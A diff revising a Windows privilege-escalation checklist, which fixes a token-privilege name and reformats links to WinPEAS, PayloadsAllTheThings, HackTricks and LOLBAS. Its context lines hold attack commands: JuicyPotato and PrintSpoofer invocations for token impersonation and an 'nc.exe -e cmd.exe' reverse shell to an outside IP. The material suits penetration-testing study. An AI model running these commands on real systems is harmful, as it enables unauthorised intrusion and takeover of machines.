@@ -1,4 +1,4 @@
-# checklist-to-escalate
+# Windows privilege escalation checklist
 
 **Author:** Julien Bongars\
 **Date:** 2025-10-16 00:07:04
@@ -28,7 +28,7 @@
 
 - [ ] `whoami /all` - Current user, groups, privileges
 - [ ] `whoami /priv` - Token privileges
-- [ ] **Check for:** `SeImpersonatePrivilege`, `SeAssignPrimaryPrivilege` → Potato attacks
+- [ ] **Check for:** `SeImpersonatePrivilege`, `SeAssignPrimaryTokenPrivilege` → Potato attacks
 - [ ] **Check for:** `SeBackupPrivilege`, `SeRestorePrivilege` → Backup/restore files
 - [ ] **Check for:** `SeDebugPrivilege` → Debug processes
 - [ ] **Check for:** `SeTakeOwnershipPrivilege`, `SeLoadDriverPrivilege`
@@ -152,7 +152,7 @@
 
 ## Token Impersonation Exploits
 
-**If SeImpersonatePrivilege or SeAssignPrimaryPrivilege enabled:**
+**If SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege enabled:**
 
 - [ ] **JuicyPotato** (Windows 2008-2016): `JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami" -t *`
 - [ ] **PrintSpoofer** (Windows 10/Server 2016-2019): `PrintSpoofer.exe -i -c cmd`
@@ -251,7 +251,8 @@ nc.exe -e cmd.exe <IP> 4444
 
 ## Resources
 
-- **PayloadsAllTheThings**: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
-- **HackTricks**: https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
-- **LOLBAS**: https://lolbas-project.github.io/
-- **GTFOBins (Windows)**: https://wadcoms.github.io/
+- [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) — best-tool link from the lede
+- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md) — Windows privilege escalation methodology
+- [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation) — Windows local privilege escalation
+- [LOLBAS](https://lolbas-project.github.io/) — living-off-the-land binaries
+- [WADComs](https://wadcoms.github.io/) — Windows command lookup (labeled GTFOBins (Windows) in the source)
